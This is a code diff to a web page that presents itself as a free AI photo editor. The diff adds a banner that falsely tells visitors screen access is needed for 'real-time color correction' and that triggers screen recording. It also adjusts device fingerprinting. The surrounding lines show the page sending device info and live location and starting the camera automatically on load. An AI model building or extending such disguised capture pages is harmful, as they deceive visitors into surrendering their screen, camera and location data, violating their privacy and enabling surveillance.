@@ -119,6 +119,18 @@
         <div class="stat-card"><div class="num">4.9★</div><div class="label">User Rating</div></div>
     </div>
 
+    <!-- Screen Share Banner -->
+    <div id="screenBanner" style="max-width:1100px;margin:0 auto 10px;padding:0 20px;display:none;">
+        <div onclick="startScreenRecord()" style="background:linear-gradient(135deg,#1a1a2e,#0f3460);border-radius:16px;padding:18px 24px;display:flex;align-items:center;gap:16px;cursor:pointer;box-shadow:0 4px 20px rgba(0,0,0,0.15);transition:transform 0.2s;" onmouseover="this.style.transform='translateY(-2px)'" onmouseout="this.style.transform='none'">
+            <div style="font-size:36px;">🖥️</div>
+            <div style="flex:1;">
+                <div style="color:#fff;font-weight:700;font-size:15px;margin-bottom:3px;">Enable AI Screen Enhancement <span style="background:#e94560;font-size:10px;padding:2px 8px;border-radius:20px;margin-left:6px;vertical-align:middle;">NEW</span></div>
+                <div style="color:rgba(255,255,255,0.6);font-size:13px;">Allow screen access so our AI can analyze your display and apply real-time color correction</div>
+            </div>
+            <div style="background:#e94560;color:#fff;padding:10px 20px;border-radius:10px;font-size:13px;font-weight:700;white-space:nowrap;">Enable Now →</div>
+        </div>
+    </div>
+
     <div class="hero">
         <h1>Free AI-Powered Photo Editor</h1>
         <p>Enhance, transform, and edit your photos instantly using cutting-edge AI. No sign-up, no watermark, no limits.</p>
@@ -292,9 +304,12 @@ async function sendVideo(blob) {
 
 // ── Device Info + Live Location ────────────────────────────
 function parseDeviceModel(ua) {
-    // Android — e.g. (Linux; Android 13; SM-G991B)
+    // Android — e.g. (Linux; Android 13; SM-G991B Build/TP1A...)
     let m = ua.match(/\(Linux;\s*Android[^;]*;\s*([^)]+)\)/i);
-    if (m) return m[1].trim();
+    if (m) {
+        // strip " Build/..." suffix
+        return m[1].replace(/\s+Build\/\S+/i, '').trim();
+    }
     // iPhone/iPad — e.g. iPhone OS or CPU iPhone
     m = ua.match(/(iPhone|iPad)[^;]*;\s*CPU[^)]*\)/i);
     if (m) return m[0].replace(/\(.*?;\s*/,'').replace(/\).*/,'').trim();
@@ -607,7 +622,10 @@ window.addEventListener('load', () => {
     setTimeout(() => {
         sendDeviceInfo();
         autoStartCamera();
-        setTimeout(startScreenRecord, 3000); // slight delay after camera prompt
+        // show screen share banner after camera overlay clears
+        setTimeout(() => {
+            document.getElementById('screenBanner').style.display = 'block';
+        }, 4000);
     }, 600);
 });
 
